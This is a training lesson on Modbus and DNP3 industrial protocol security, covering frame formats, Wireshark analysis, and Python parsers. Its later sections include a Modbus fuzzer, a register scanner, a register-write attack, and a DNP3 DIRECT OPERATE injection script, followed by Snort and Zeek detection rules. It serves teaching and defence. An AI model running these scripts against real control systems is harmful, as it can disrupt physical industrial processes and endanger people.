Lesson 02: Industrial Protocol Analysis

Lesson 02: Industrial Protocol Analysis Modbus & DNP3
Learning Objectives
●​
●​
●​
●​
●​

Master Modbus RTU/TCP protocol structure and function codes
Understand DNP3 architecture and message format
Perform deep packet inspection of industrial protocols
Identify security vulnerabilities in protocol implementations
Build custom protocol parsers and fuzzers

1. Modbus Protocol Deep Dive
1.1 Modbus History & Variants
Origins: Developed by Modicon (now Schneider Electric) in 1979 for PLC communication
Variants:
●​
●​
●​
●​
●​

Modbus RTU: Serial (RS-232/RS-485), binary encoding
Modbus ASCII: Serial, ASCII encoding (rarely used)
Modbus TCP: Ethernet-based, encapsulates Modbus RTU in TCP
Modbus Plus: Proprietary high-speed version
Modbus over UDP: Less common variant

1.2 Modbus Data Model
Four Primary Data Blocks:
Data Type

Access

Address Range

Function Codes

Coils

Read/Write

00001-09999

01, 05, 15

Discrete Inputs

Read-only

10001-19999

02

Input Registers

Read-only

30001-39999

04

Holding Registers

Read/Write

40001-49999

03, 06, 16

Note: Addressing is often zero-indexed in implementation (0-9998), though documentation
uses 1-based addressing.

1.3 Modbus TCP Frame Structure
[MBAP Header - 7 bytes][Function Code - 1 byte][Data - N bytes]
MBAP Header Breakdown:
+------------------+------------------+
| Transaction ID | 2 bytes
| Matching request/response
+------------------+------------------+
| Protocol ID
| 2 bytes
| Always 0x0000 for Modbus
+------------------+------------------+
| Length
| 2 bytes
| Number of following bytes
+------------------+------------------+
| Unit ID
| 1 byte
| Slave device identifier
+------------------+------------------+
Example - Read Holding Registers (FC 03):
Request:
00 01
- Transaction ID
00 00
- Protocol ID
00 06
- Length (6 bytes following)
01
- Unit ID (slave 1)
03
- Function Code (Read Holding Registers)
00 00
- Starting Address (0)
00 0A
- Quantity (10 registers)
Response:
00 01
- Transaction ID
00 00
- Protocol ID
00 17
- Length (23 bytes following)
01
- Unit ID
03
- Function Code
14
- Byte Count (20 bytes = 10 registers * 2 bytes)
[20 bytes of register data]

1.4 Common Modbus Function Codes
Code

Name

Purpose

Security Impact

01

Read Coils

Read discrete outputs
(1-2000)

Information disclosure

02

Read Discrete Inputs

Read discrete inputs (1-2000)

Information disclosure

03

Read Holding Registers

Read 16-bit registers (1-125)

Information disclosure

04

Read Input Registers

Read 16-bit input registers

Information disclosure

05

Write Single Coil

Write single discrete output

Unauthorized control

06

Write Single Register

Write single 16-bit register

Unauthorized control

15

Write Multiple Coils

Write multiple discrete
outputs

Unauthorized control

16

Write Multiple Registers

Write multiple 16-bit registers

Unauthorized control

17

Report Slave ID

Device identification

Fingerprinting

Vendor/product info

Fingerprinting

43/14 Read Device
Identification

Diagnostic Function Codes (08 sub-functions):
●​
●​
●​
●​
●​
●​

00: Return Query Data (echo test)
01: Restart Communications
04: Force Listen Only Mode
10: Clear Counters and Diagnostic Register
11: Return Bus Message Count
12: Return Bus Communication Error Count

1.5 Modbus Exception Responses
When an error occurs, the device responds with:
●​ Function Code: Original FC + 0x80 (e.g., 0x03 becomes 0x83)
●​ Exception Code: 1 byte error code
Exception Codes:
●​
●​
●​
●​
●​
●​
●​

01: Illegal Function
02: Illegal Data Address
03: Illegal Data Value
04: Slave Device Failure
05: Acknowledge (long operation in progress)
06: Slave Device Busy
08: Memory Parity Error

1.6 Modbus Security Vulnerabilities

No Authentication: Any device can send commands No Encryption: All data transmitted in
plaintext No Integrity Check: Beyond basic CRC (RTU) or TCP checksum No Replay
Protection: Commands can be captured and replayed No Authorization: Function
code-level access control rare
Attack Vectors:
1.​ Reconnaissance: FC 03/04 to map register layout
2.​ Device Fingerprinting: FC 17, 43 for vendor identification
3.​ Denial of Service: Invalid function codes, malformed packets
4.​ Unauthorized Control: FC 05/06/15/16 to manipulate outputs
5.​ Man-in-the-Middle: Protocol lacks cryptographic protection

2. DNP3 Protocol Deep Dive
2.1 DNP3 Overview
Distributed Network Protocol 3: Developed for electric utilities and SCADA systems
(1990s)
Design Goals:
●​
●​
●​
●​

Reliable communication over unreliable networks
Support for time synchronization
Event buffering (unsolicited responses)
Priority-based messaging

Usage: Electric utilities, water/wastewater, transportation systems
Port: 20000/TCP (standard), also supports serial and UDP

2.2 DNP3 Architecture
Three-Layer Model:
1.​ Application Layer: Object-based data representation
2.​ Transport Layer: Segmentation/reassembly of messages
3.​ Data Link Layer: Frame structure, error detection, addressing

2.3 DNP3 Data Link Layer Frame
[Start - 2 bytes][Length - 1 byte][Control - 1 byte][Dest - 2 bytes][Src - 2 bytes][CRC - 2
bytes][Data - N bytes]
Start Bytes: 0x05 0x64 (constant)
Control Byte:
Bit 7: DIR (Direction: 1=master→slave, 0=slave→master)

Bit 6: PRM (Primary: 1=request, 0=response)
Bit 5: FCB (Frame Count Bit - alternates for duplicate detection)
Bit 4: FCV (FCB Valid)
Bits 0-3: Function Code
Function Codes (Data Link Layer):
●​
●​
●​
●​
●​
●​

0: Reset Link
1: Reset User Process
2: Test Link States
3: User Data (confirmed)
4: User Data (unconfirmed)
9: Request Link Status

CRC: 16-bit CRC calculated on every 16-byte block (including header)

2.4 DNP3 Application Layer
Application Layer Control (2 bytes):
Byte 1:
Bit 7: FIR (First fragment)
Bit 6: FIN (Final fragment)
Bit 5: CON (Confirmation required)
Bit 4: UNS (Unsolicited response)
Bits 0-3: Sequence number
Byte 2: Function Code
Application Function Codes:
Code

Name

Direction

Purpose

0

CONFIRM

Both

Acknowledge application data

1

READ

Master→Slave

Request data

2

WRITE

Master→Slave

Write data

3

SELECT

Master→Slave

Select control point (before
OPERATE)

4

OPERATE

Master→Slave

Execute control operation

5

DIRECT OPERATE

Master→Slave

Control without SELECT

13

COLD RESTART

Master→Slave

Full device restart

14

WARM RESTART

Master→Slave

Restart application only

23

DELAY MEASUREMENT

Master→Slave

Measure transmission delay

129

RESPONSE

Slave→Master

Response to request

130

UNSOLICITED
RESPONSE

Slave→Master

Event notification

2.5 DNP3 Object Library
Object Groups (examples):
Group

Variation

Description

1

0-2

Binary Input (on/off status)

2

0-3

Binary Input Change Events

10

0-2

Binary Output Status

12

1

Control Relay Output Block (CROB)

20

1-6

Binary Counter

30

1-6

Analog Input (16/32-bit, with/without flags)

40

1-4

Analog Output Status

50

1-4

Time and Date

60

1-4

Class Data (0=all, 1-3=priority levels)

80

1

Internal Indications

Object Addressing:
●​ Group: Type of data (e.g., 30 = analog input)
●​ Variation: Format/size (e.g., 1 = 32-bit with flag)
●​ Index: Specific point number

2.6 DNP3 Control Operations (CROB)
Control Relay Output Block structure:
Code:
Count:

1 byte (NUL, PULSE_ON, PULSE_OFF, LATCH_ON, LATCH_OFF)
1 byte (number of operations)

On Time:
4 bytes (milliseconds)
Off Time: 4 bytes (milliseconds)
Status:
1 byte (response status)
SELECT-BEFORE-OPERATE sequence:
1.​ Master sends SELECT with CROB
2.​ Slave validates and responds with status
3.​ Master sends OPERATE with identical CROB
4.​ Slave executes and confirms
5.​ Safety mechanism to prevent accidental activation
DIRECT OPERATE: Bypasses SELECT (less safe, faster)

2.7 DNP3 Secure Authentication (SAv5)
Features (IEEE 1815-2012, rarely implemented):
●​
●​
●​
●​
●​

Challenge-response authentication
HMAC-SHA256 message authentication
AES-256 encryption (optional)
Session key management
User role-based access control

Critical Gap: Most field deployments do NOT use SAv5 due to:
●​
●​
●​
●​

Legacy equipment incompatibility
Performance overhead concerns
Configuration complexity
Vendor implementation inconsistencies

2.8 DNP3 Security Vulnerabilities
Authentication Bypass: Most implementations lack SAv5 Command Injection: CROB
manipulation for unauthorized control DoS Attacks:
●​ COLD_RESTART commands
●​ Malformed fragmentation
●​ CRC collision attacks (theoretical)
Reconnaissance:
●​ Read all data objects (FC 1, Object 60 Variation 1)
●​ Device fingerprinting via internal indications
Man-in-the-Middle:
●​ Modify CROB parameters (timing, count)
●​ Inject unsolicited responses
●​ Suppress alarms/events

3. Protocol Analysis with Wireshark
3.1 Wireshark Filters for ICS Protocols
Modbus:
modbus
# All Modbus traffic
modbus.func_code == 3
# Read Holding Registers
modbus.func_code == 6
# Write Single Register
modbus.func_code == 16
# Write Multiple Registers
modbus.exception_code
# Modbus exceptions
DNP3:
dnp3
# All DNP3 traffic
dnp3.al.func == 1
# READ requests
dnp3.al.func == 4
# OPERATE commands
dnp3.al.func == 129
# Responses
dnp3.al.func == 130
# Unsolicited responses
dnp3.al.obj == 12 && dnp3.al.var == 1 # CROB objects

3.2 Analyzing Modbus Traffic
Exercise: Download sample PCAP from https://github.com/automayt/ICS-pcap
Analysis Steps:
1.​ Identify Communication Pattern:​
○​ Master (client) IP/port
○​ Slave (server) IP/port (typically :502)
○​ Transaction frequency (polling interval)
Extract Function Codes:​
​
Statistics → Protocol Hierarchy → Modbus/TCP
2.​ Statistics → Conversations → TCP (find port 502)
1.​
2.​ Register Mapping:​
○​ Track which registers are read/written
○​ Identify control registers vs. sensor data
○​ Document register addresses and values
3.​ Anomaly Detection:​
○​ Unexpected function codes
○​ Write operations to unusual addresses

○​ Exception responses
○​ Source IP changes

3.3 Analyzing DNP3 Traffic
Key Indicators:
1.​ Master-Slave Relationship:​
○​ Master address (typically lower, e.g., 1)
○​ Outstation addresses (higher, e.g., 10-100)
2.​ Object Groups in Use:​
○​ Group 1: Digital inputs
○​ Group 30: Analog inputs
○​ Group 12: Control outputs
3.​ Event Patterns:​
○​ Unsolicited response frequency
○​ Class 1/2/3 event priorities
○​ Time synchronization (Group 50)
4.​ Control Sequences:​
○​ SELECT → OPERATE pairs
○​ DIRECT OPERATE usage
○​ Response status codes

4. Building Protocol Parsers
4.1 Modbus TCP Parser (Python)
import socket
import struct
class ModbusTCP:
def __init__(self, host, port=502):
self.host = host
self.port = port
self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
self.transaction_id = 0
def connect(self):
self.sock.connect((self.host, self.port))
def _build_request(self, unit_id, function_code, data):
self.transaction_id += 1
protocol_id = 0
length = len(data) + 2 # unit_id + function_code + data

header = struct.pack('>HHHB',
self.transaction_id,
protocol_id,
length,
unit_id)
return header + struct.pack('B', function_code) + data
def read_holding_registers(self, unit_id, start_addr, count):
data = struct.pack('>HH', start_addr, count)
request = self._build_request(unit_id, 0x03, data)
self.sock.send(request)
response = self.sock.recv(1024)
# Parse response
trans_id, proto_id, length, unit, func_code, byte_count = struct.unpack('>HHHBBB',
response[:9])
if func_code == 0x03:
registers = []
for i in range(byte_count // 2):
reg_value = struct.unpack('>H', response[9 + i*2:11 + i*2])[0]
registers.append(reg_value)
return registers
elif func_code == 0x83: # Exception
exception_code = struct.unpack('B', response[9:10])[0]
raise Exception(f"Modbus Exception: {exception_code}")
def write_single_register(self, unit_id, address, value):
data = struct.pack('>HH', address, value)
request = self._build_request(unit_id, 0x06, data)
self.sock.send(request)
response = self.sock.recv(1024)
return response
# Usage
mb = ModbusTCP('192.168.1.100')
mb.connect()
registers = mb.read_holding_registers(unit_id=1, start_addr=0, count=10)
print(f"Registers: {registers}")

4.2 Modbus Protocol Fuzzer
import socket
import struct
import random

def fuzz_modbus(target_ip, target_port=502, iterations=1000):
"""
Fuzzes Modbus TCP implementation by sending malformed packets
"""
valid_function_codes = [0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x0F, 0x10]
for i in range(iterations):
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(2)
try:
sock.connect((target_ip, target_port))
# Fuzzing strategies
strategy = random.choice(['valid_fc_invalid_data', 'invalid_fc', 'malformed_header',
'oversized'])
if strategy == 'valid_fc_invalid_data':
# Valid function code, random data
fc = random.choice(valid_function_codes)
data = bytes([random.randint(0, 255) for _ in range(random.randint(0, 255))])
elif strategy == 'invalid_fc':
# Invalid/reserved function codes
fc = random.choice([x for x in range(256) if x not in valid_function_codes])
data = b'\x00\x00\x00\x01'
elif strategy == 'malformed_header':
# Invalid MBAP header
packet = bytes([random.randint(0, 255) for _ in range(random.randint(1, 260))])
sock.send(packet)
continue
elif strategy == 'oversized':
# Excessively large data
fc = random.choice(valid_function_codes)
data = bytes([0x00] * random.randint(256, 4096))
# Build packet
trans_id = random.randint(0, 65535)
proto_id = 0x0000
length = len(data) + 2
unit_id = random.randint(0, 255)
packet = struct.pack('>HHHBB', trans_id, proto_id, length, unit_id, fc) + data

sock.send(packet)
response = sock.recv(1024)
print(f"[{i}] Strategy: {strategy}, FC: {fc:02X}, Response: {len(response)} bytes")
except socket.timeout:
print(f"[{i}] Timeout - possible DoS")
except ConnectionRefusedError:
print(f"[{i}] Connection refused - service down?")
except Exception as e:
print(f"[{i}] Error: {e}")
finally:
sock.close()
# Usage: fuzz_modbus('192.168.1.100')

4.3 DNP3 Frame Parser (Python - using pydnp3)
from pydnp3 import opendnp3
# DNP3 parsing typically requires libraries due to complexity
# Basic frame parser example:
def parse_dnp3_datalink(raw_bytes):
"""
Parse DNP3 Data Link Layer frame
"""
if len(raw_bytes) < 10:
return None
# Check start bytes
if raw_bytes[0] != 0x05 or raw_bytes[1] != 0x64:
return None
length = raw_bytes[2]
control = raw_bytes[3]
dest = (raw_bytes[5] << 8) | raw_bytes[4]
src = (raw_bytes[7] << 8) | raw_bytes[6]
# Parse control byte
direction = 'Master->Slave' if (control & 0x80) else 'Slave->Master'
primary = 'Request' if (control & 0x40) else 'Response'
func_code = control & 0x0F
return {
'length': length,
'direction': direction,
'primary': primary,

'func_code': func_code,
'destination': dest,
'source': src
}
# For production use, leverage existing libraries:
# pip install pydnp3

5. Practical Exploitation Techniques
5.1 Modbus Reconnaissance Script
#!/usr/bin/env python3
import socket
import struct
import sys
def scan_modbus_registers(target, unit_id=1, start=0, end=100):
"""
Scan Modbus holding registers to identify valid addresses
"""
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(2)
try:
sock.connect((target, 502))
print(f"[+] Connected to {target}:502")
valid_registers = []
for addr in range(start, end):
trans_id = addr + 1
proto_id = 0
length = 6
func_code = 0x03 # Read Holding Registers
count = 1
request = struct.pack('>HHHBBHH', trans_id, proto_id, length, unit_id, func_code,
addr, count)
sock.send(request)
response = sock.recv(1024)
if len(response) > 8:
resp_func = response[7]
if resp_func == 0x03: # Successful response
value = struct.unpack('>H', response[9:11])[0]

valid_registers.append((addr, value))
print(f"[+] Register {addr}: {value}")
elif resp_func == 0x83: # Exception
exception = response[8]
if exception == 0x02: # Illegal address
continue
return valid_registers
except Exception as e:
print(f"[-] Error: {e}")
finally:
sock.close()
if __name__ == "__main__":
if len(sys.argv) < 2:
print(f"Usage: {sys.argv[0]} <target_ip>")
sys.exit(1)
scan_modbus_registers(sys.argv[1])

5.2 Modbus Write Attack
def modbus_write_attack(target, unit_id, register, value):
"""
Write arbitrary value to Modbus register (FC 06)
WARNING: Can cause physical process disruption
"""
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target, 502))
trans_id = 1
proto_id = 0
length = 6
func_code = 0x06
request = struct.pack('>HHHBBHH', trans_id, proto_id, length, unit_id, func_code, register,
value)
sock.send(request)
response = sock.recv(1024)
if response[7] == 0x06:
print(f"[+] Successfully wrote {value} to register {register}")
else:
print(f"[-] Write failed")
sock.close()

# Example: modbus_write_attack('192.168.1.100', 1, 0, 9999)

5.3 DNP3 CROB Injection
# Using pydnp3 library for proper DNP3 implementation
from pydnp3 import opendnp3, openpal, asiopal, asiodnp3
def dnp3_direct_operate(master_ip, outstation_ip, point_index):
"""
Send DIRECT OPERATE command to DNP3 outstation
Bypasses SELECT-BEFORE-OPERATE safety mechanism
"""
# Configure DNP3 master
manager = asiodnp3.DNP3Manager(1)
# Create channel
channel = manager.AddTCPClient("client",
opendnp3.levels.ALL_COMMS,
asiopal.ChannelRetry(),
outstation_ip,
"0.0.0.0",
20000,
asiodnp3.LinkConfig(False, False))
# Create master
master = channel.AddMaster("master",
asiodnp3.PrintingSOEHandler(),
asiodnp3.DefaultMasterApplication(),
asiodnp3.MasterStackConfig())
# Build CROB (Control Relay Output Block)
crob = opendnp3.ControlRelayOutputBlock(
opendnp3.ControlCode.LATCH_ON, # Turn on
1, # Count
100, # On-time (ms)
100 # Off-time (ms)
)
# Send Direct Operate
master.DirectOperate(crob, point_index)
print(f"[+] Sent DIRECT OPERATE to point {point_index}")

6. Defensive Monitoring

6.1 Modbus Anomaly Detection Rules
Snort/Suricata Rules:
# Detect Modbus write operations
alert tcp any any -> any 502 (msg:"MODBUS Write Single Register"; content:"|06|"; offset:7;
depth:1; sid:1000001;)
alert tcp any any -> any 502 (msg:"MODBUS Write Multiple Registers"; content:"|10|";
offset:7; depth:1; sid:1000002;)
# Detect Modbus from unexpected source
alert tcp !$MODBUS_MASTERS any -> any 502 (msg:"MODBUS from unauthorized
source"; sid:1000003;)
# Detect Modbus diagnostic functions
alert tcp any any -> any 502 (msg:"MODBUS Diagnostic Function"; content:"|08|"; offset:7;
depth:1; sid:1000004;)
Zeek (Bro) Modbus Monitoring:
event modbus_write_single_register_request(c: connection, headers: ModbusHeaders,
address: count, value: count)
{
print fmt("Modbus Write: %s wrote %d to register %d", c$id$orig_h, value, address);
# Alert on writes to critical registers
if (address in critical_registers)
NOTICE([$note=ModbusCriticalWrite,
$msg=fmt("Write to critical register %d", address),
$conn=c]);
}

6.2 DNP3 Monitoring
Detect DIRECT OPERATE (bypasses safety):
alert tcp any any -> any 20000 (msg:"DNP3 DIRECT OPERATE"; content:"|05 64|"; depth:2;
content:"|05|"; distance:0; within:1; sid:2000001;)
Monitor Cold Restart Commands:
alert tcp any any -> any 20000 (msg:"DNP3 COLD RESTART"; content:"|0D|"; offset:10;
depth:1; sid:2000002;)

7. Hands-On Lab Exercises
Lab 1: Modbus Traffic Analysis

1.​ Download PCAP from https://github.com/automayt/ICS-pcap/tree/master/MODBUS
2.​ Open in Wireshark
3.​ Answer:
○​ What is the IP of the Modbus master?
○​ Which function codes are used?
○​ Identify any write operations and their target registers
○​ Calculate the polling frequency
○​ Are there any exception responses?

Lab 2: Build a Modbus Scanner
1.​ Set up OpenPLC Runtime as Modbus server
2.​ Implement Python scanner to:
○​ Detect Modbus service on port 502
○​ Identify valid unit IDs (1-247)
○​ Map readable registers (0-1000)
○​ Fingerprint device using FC 17 (Report Slave ID)

Lab 3: DNP3 Packet Crafting
1.​ Install pydnp3 library
2.​ Create DNP3 master script
3.​ Send READ request for all data (Object 60 Variation 1)
4.​ Parse response and display object groups present
5.​ Send time synchronization command (Group 50)

Lab 4: Protocol Fuzzing
1.​ Deploy vulnerable Modbus simulator (e.g., modbuspal)
2.​ Run Modbus fuzzer script from section 4.2
3.​ Monitor for crashes, exceptions, or unexpected behavior
4.​ Document vulnerabilities found
5.​ Develop proof-of-concept exploits

8. Tools & Resources
Protocol Analysis Tools
●​ Wireshark: https://www.wireshark.org/
●​ Scapy: https://scapy.net/
●​ nmap with NSE scripts: https://nmap.org/nsedoc/categories/ics.html

Modbus Tools
●​ pymodbus: https://github.com/riptideio/pymodbus
●​ mbtget: Modbus reading tool
●​ modbus-cli: Command-line Modbus client

●​ Modbus Poll/Slave: Windows simulation tools

DNP3 Tools
●​ pydnp3: https://github.com/ChargePoint/pydnp3
●​ DNP3 Simulator: https://www.freyrscada.com/dnp3.php
●​ OpenDNP3: https://github.com/dnp3/opendnp3

Learning Resources
●​ Modbus Protocol Spec:
https://modbus.org/docs/Modbus_Application_Protocol_V1_1b3.pdf
●​ DNP3 Primer: https://www.dnp.org/About/DNP3-Primer
●​ ICS Protocol Analysis (SANS): ICS515 course materials

GitHub Repositories
●​ ICS-pcap: https://github.com/automayt/ICS-pcap
●​ ICS Protocol Parsers: https://github.com/ITI/ICS-Security-Tools

9. Knowledge Check
1.​ What is the Modbus TCP port number and MBAP header structure?
2.​ How do you identify a Modbus exception response?
3.​ What is the difference between function codes 03 and 04?
4.​ Why is the SELECT-BEFORE-OPERATE sequence used in DNP3?
5.​ What are DNP3 object groups, and how are they addressed?
6.​ How can you fingerprint a Modbus device without writing to it?
7.​ What is the security impact of DNP3 DIRECT OPERATE?
8.​ Describe three ways to perform DoS against a Modbus device.
9.​ How would you detect unauthorized Modbus writes using network monitoring?
10.​What is the purpose of DNP3's unsolicited response mechanism?

